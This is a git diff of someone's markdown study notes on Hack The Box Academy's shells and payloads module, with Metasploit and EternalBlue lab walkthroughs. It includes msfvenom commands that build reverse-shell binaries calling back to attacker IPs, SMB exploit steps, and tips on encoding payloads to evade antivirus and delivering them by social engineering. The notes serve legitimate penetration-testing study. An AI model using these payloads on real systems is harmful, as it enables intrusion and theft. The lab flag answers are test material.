@@ -14,14 +14,14 @@
     - [Q](#connect-to-the-target-via-rdp-and-establish-a-reverse-shell-session-with-your-attack-box-then-submit-the-hostname-of-the-target-box)
 - [Payloads](#payloads)
   - [Introduction to Payloads](#introduction-to-payloads)
-    - [One-liners Examined](#one-liners-examined) 
-      - [Netcat/Bash Reverse Shell One-liner](#netcatbash-reverse-shell-one-liner) 
+    - [One-liners Examined](#one-liners-examined)
+      - [Netcat/Bash Reverse Shell One-liner](#netcatbash-reverse-shell-one-liner)
         - [Remove /tmp/f](#remove-tmpf)
         - [Make A Named Pipe](#make-a-named-pipe)
         - [Output Redirection](#output-redirection)
         - [Set Shell Options](#set-shell-options)
         - [Open a Connection with Netcat](#open-a-connection-with-netcat)
-      - [PowerShell One-liner Explained](#powershell-one-liner-explained) 
+      - [PowerShell One-liner Explained](#powershell-one-liner-explained)
         - [Calling Powershell](#calling-powershell)
         - [Binding a socket](binding-a-socket)
         - [Setting The Command Stream](#setting-the-command-stream)
@@ -32,16 +32,16 @@
         - [Show Working Directory](#show-working-directory)
         - [Sets Sendbyte](#sets-sendbyte)
         - [Terminate TCP Connection](#terminate-tcp-connection)
-    - [Payloads Take Different Shapes and Forms](#payloads-take-different-shapes-and-forms) 
-  - [Automating Payloads & Delivery with Metasploit](#automating-payloads--delivery-with-metasploit) 
+    - [Payloads Take Different Shapes and Forms](#payloads-take-different-shapes-and-forms)
+  - [Automating Payloads & Delivery with Metasploit](#automating-payloads--delivery-with-metasploit)
     - [Using Metasploit](#using-metasploit)
       - [Start Metasploit](#start-metasploit)
       - [Search in Metasploit](#search-in-metasploit)
       - [Select the options](#select-the-option)
       - [Checking the options](#checking-the-options)
       - [Set the options](#set-the-options)
-    - [Q](#q-exploit-the-target-using-what-youve-learned-in-this-section-then-submit-the-name-of-the-file-located-in-htb-students-documents-folder-format-filenameextension) 
-  - [Crafting Payloads with MSFvenom](#crafting-payloads-with-msfvenom) 
+    - [Q](#q-exploit-the-target-using-what-youve-learned-in-this-section-then-submit-the-name-of-the-file-located-in-htb-students-documents-folder-format-filenameextension)
+  - [Crafting Payloads with MSFvenom](#crafting-payloads-with-msfvenom)
     - [Crafting Payloads with MSFvenom](#crafting-payloads-with-msfvenom-1)
     - [Staged vs. Stageless Payloads](#staged-vs-stageless-payloads)
     - [Building A Stageless Payload](#building-a-stageless-payload)
@@ -52,9 +52,6 @@
     - [Enumerating Windows & Fingerprinting Methods](#enumerating-windows--fingerprinting-methods)
       - [Pinging a machine](#pinging-a-machine)
       - [OS Detection Scan](#os-detection-scan)
-      
-
-
 
 # Shell Basics
 
@@ -422,23 +419,15 @@ Not all payloads are one-liners. Some payloads that we are going to use come fro
 
 ## Automating Payloads & Delivery with Metasploit
 
-
-
-Metaspoit is an automated attack framework that makes it easier when you are in the process of exploiting vulnerabilites. 
-
-
+Metaspoit is an automated attack framework that makes it easier when you are in the process of exploiting vulnerabilites.
 
 It has **pre-built** modules that we can use to exploit vulnerabilities and deliver payloads.
 
-
-
 I will use the community edition of Metasploit and using the **pre-built** modules and craft payloads with **MSFVenom**
-
-
 
 ### Using Metasploit
 
---- 
+---
 
 #### Start Metasploit
 
@@ -448,7 +437,7 @@ To start Metasploit in our console we launch the program as root with this comma
 DanielBoye@htb[/htb]$ sudo msfconsole 
 ```
 
-#### 
+####
 
 #### Search in Metasploit
 
@@ -456,11 +445,9 @@ DanielBoye@htb[/htb]$ sudo msfconsole
 msf6 > search smb
 ```
 
-To search use `search`, and then the key word. 
+To search use `search`, and then the key word.
 
 When searching for modules we need to know that they have different **Names**, **Disclosure Date**, **Rank**, **Check** and **Description**.
-
-
 
 #### Select the option
 
@@ -468,9 +455,7 @@ When searching for modules we need to know that they have different **Names**, *
 msf6 > use 56
 ```
 
-To select the option, use `use`. Then provide the number of what module you want to use. 
-
-
+To select the option, use `use`. Then provide the number of what module you want to use.
 
 #### Checking the options
 
@@ -483,8 +468,6 @@ Check options with `options`.
 When you have found a module to use, we often want to check the options we have.
 
 We do this to check what options we need to set before running the module
-
-
 
 #### Set the options
 
@@ -503,15 +486,12 @@ LHOST => 10.10.14.222
 
 Here is an example of setting up a SMB module with the command `set`
 
-
-
 Key takeaways!
 
-- `RHOST` is the IP adress for the **target** 
-
+- `RHOST` is the IP adress for the **target**
+  
 - `LHOST` is the IP adress of **our own** local machine
-
-
+  
 
 #### Run the Exploit!
 
@@ -532,11 +512,7 @@ meterpreter >
 
 Run the exploit with `exploit`.
 
-
-
 In this demonstration we obtained a shell with metepreter.
-
-
 
 #### Create **interactive shell** to the victims computer
 
@@ -549,13 +525,11 @@ Microsoft Windows [Version 10.0.18362.1256]
 C:\WINDOWS\system32>
 ```
 
-Create a **interactive shell** in metepreter with `shell` 
-
-
+Create a **interactive shell** in metepreter with `shell`
 
 ### Q: Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)
 
-Scan target 
+Scan target
 
 ```shell-session
 nmap -sC -sV -Pn 10.129.201.160
@@ -579,8 +553,6 @@ search smb
 use 58
 ```
 
-
-
 Now set up the options
 
 ```shell-session
@@ -597,33 +569,22 @@ exploit
 
 ![image](https://user-images.githubusercontent.com/83395536/224510223-cec44c45-5fa1-47fd-9655-4a94d2fdb3d7.png)
 
-
-
 Now we need to find the name of the file that is in the Documents folder for the user we have logged in as. To do this we need to know how to move around in folders in Windows.
-
-
 
 Use `dir` to print out the files in the Documents folder to find the name of the file that is the flag
 
 ![image](https://user-images.githubusercontent.com/83395536/224510180-f91967ca-661c-46fd-b47f-4d8dc57e1f05.png)
 
-
-
 And here our flag is the file `staffsalaries.txt`.
-
-
 
 ## Crafting Payloads with MSFvenom
 
-
-
 - Automated attacks in Metasploit **needs network access** to a vulnerable machine
-
+  
 - MSFvenom can be used to craft a payload and send it via email or other social engineering techniques to get the user to execute the file
-
+  
 - MSFvenom can **encrypt and encode** your payload to bypass common anti-virus detection signatures.
-
-
+  
 
 ### Crafting Payloads with MSFvenom
 
@@ -633,35 +594,34 @@ List the available payloads:
 msfvenom -l payloads
 ```
 
-
-
 ### Staged vs. Stageless Payloads
 
 Staged payloads
 
 - Sending more **components** in our attack
-
+  
 - Setting a stage
-
+  
 - liunx/x86/shell/reverse_tcp
   
   - First initialize payload with executing on target
-  
+    
   - It then calls back to out **attack box** to download the remainder of the exploit
+    
 
 Stageless paylaods
 
 - Does not have a stage
-
+  
 - Better for evading
   
   - Less traffic passing over the network to execute the payload
 
-### 
+###
 
 ### Building A Stageless Payload
 
-Build it 
+Build it
 
 ```shellsession
 DanielBoye@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
@@ -674,8 +634,6 @@ Final size of elf file: 194 bytes
 ```
 
 Break down the command
-
-
 
 Call MSFvenom
 
@@ -727,39 +685,29 @@ Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 ```
 
-
-
 # Windows Shells
 
 ## Infiltrating Windows
 
 Windows contains a fair share of market share in the computer space. With that huge share, comes some prominent Windows Exploits.
 
-
-
 ### Prominent Windows Exploits
 
-| **Vulnerability** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
-| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `MS08-067`        | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.                                                                                                                                                                                      |
-| `Eternal Blue`    | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.                                                                                                |
-| `PrintNightmare`  | A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).                                                                                          |
-| `BlueKeep`        | CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.                                                                                                                                                                                                                                                     |
-| `Sigred`          | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.                                                                                                                                                                                                   |
-| `SeriousSam`      | CVE 2021-36924 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. |
-| `Zerologon`       | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.              |
-
-
+| **Vulnerability** | **Description** |
+| --- | --- |
+| `MS08-067` | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability. |
+| `Eternal Blue` | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host. |
+| `PrintNightmare` | A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html). |
+| `BlueKeep` | CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2. |
+| `Sigred` | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller. |
+| `SeriousSam` | CVE 2021-36924 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. |
+| `Zerologon` | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds. |
 
 ### Enumerating Windows & Fingerprinting Methods
 
 To hack a target, we need to know it's operating system. One way of knowing that the target is a Windows machine is to look at the **Time To Live** (TTL) counter when utilizing ICMP to determine if the host is up.
 
-
-
-A typical responce from a Windows host would be either 32 or 128 (most common).  
-
-
+A typical responce from a Windows host would be either 32 or 128 (most common).
 
 #### Pinging a machine
 
@@ -773,11 +721,9 @@ PING 192.168.86.39 (192.168.86.39): 56 data bytes
 64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
 ```
 
-Here we can see that the TTL is `ttl=128`, so our target is most likely to be a Windows host. 
+Here we can see that the TTL is `ttl=128`, so our target is most likely to be a Windows host.
 
-
-
-#### OS Detection Scan
+#### OS Detection Scan
 
 ```shell-session
 DanielBoye@htb[/htb]$ sudo nmap -v -O 192.168.86.39
@@ -818,3 +764,168 @@ Network Distance: 1 hop
 
 Here we use the flag `-v` for outputting the `-O` as verbose. `-O` means we are running an OS Identification scan against our target.
 
+#### Using banner.nse to enumerate ports
+
+```shell-session
+DanielBoye@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
+NSE: Loaded 1 scripts for scanning.
+<snip>
+Discovered open port 135/tcp on 192.168.86.39
+Discovered open port 139/tcp on 192.168.86.39
+Discovered open port 445/tcp on 192.168.86.39
+Discovered open port 443/tcp on 192.168.86.39
+Discovered open port 912/tcp on 192.168.86.39
+Discovered open port 902/tcp on 192.168.86.39
+Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
+NSE: Script scanning 192.168.86.39.
+Initiating NSE at 18:01
+Completed NSE at 18:01, 20.11s elapsed
+Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
+Host is up (0.012s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+443/tcp open  https
+445/tcp open  microsoft-ds
+902/tcp open  iss-realsecure
+| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
+|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
+912/tcp open  apex-mesh
+| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
+|_col:SOAP, MKSDisplayProtocol:VNC , ,
+MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
+```
+
+Just another way to try and fingerprint the host to check if it is a Windows machine.
+
+### Payload files for Windows
+
+- DDL
+  
+  - Dynamic Linking Libary
+    
+  - Injecting a malicious DDL or hjicaking a vulnerable libary on the host can elevate our priviles to SYSTEM or bypass User Account Controls
+    
+- Batch
+  
+  - Text based DOS scripts
+    
+  - .bat
+    
+  - Run automated command
+    
+  - Can use it to
+    
+    - Open up a port on the host
+      
+    - Connect back to our attacking box
+      
+- VBS
+  
+  - VBScript
+    
+  - Based on Microsofts Visual Basic
+    
+  - Enables the loading of **Macros**
+    
+- MSI
+  
+  - .MSI
+    
+  - Windows Installer
+    
+  - Use it to craft a payload
+    
+  - Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.
+    
+- Powershell
+  
+  - Shell envionment and scripting language
+    
+  - Gives options with gaining shell and execution on a host
+    
+
+### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution
+
+There are many ways to create payloads but you can use frameworks for that. Here is what HTB Academy says:
+
+| **Resource** | **Description** |
+| --- | --- |
+| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
+| `Payloads All The Things` | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology. |
+| `Mythic C2 Framework` | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. |
+| `Nishang` | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. |
+| `Darkarmour` | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts. |
+
+#### Payload Transfer and Execution
+
+Trying to drop a payload on a target
+
+- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
+- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
+- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
+- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
+- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.
+
+### Q: Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\
+
+Attack chain
+
+Enumerate
+
+```shell-session
+sudo nmap -v -A 10.129.201.97
+```
+
+```shell-session
+msfconsole
+```
+
+```shell-session
+use auxiliary/scanner/smb/smb_ms17_010 
+```
+
+```shell-session
+set RHOST 10.129.201.97
+```
+
+```shell-session
+run
+```
+
+And we can see that the victim is vulnerable
+
+Now lets use MS17_010
+
+```shell-session
+search eternal
+```
+
+```shell-session
+use 2
+```
+
+```shell-session
+set RHOST 10.129.201.97
+```
+
+```shell-session
+set LHOST tun0
+```
+
+```shell-session
+run
+```
+
+boom
+
+Then just move to the C:\ and cat the flag.txt file!
+
+# NIX Shells
+
+## Infiltrating Unix/Linux
+
+Linux is used everywhere, that is why it is important to know how to hack it :)
